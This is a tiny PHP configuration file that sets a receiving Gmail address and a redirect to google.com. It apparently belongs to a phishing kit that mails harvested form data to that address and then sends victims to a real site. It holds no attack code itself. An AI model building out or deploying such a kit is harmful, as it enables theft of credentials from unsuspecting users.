<?php 
$Receive_email="goldrauschshop2020@gmail.com";
$redirect="https://www.google.com/";
?>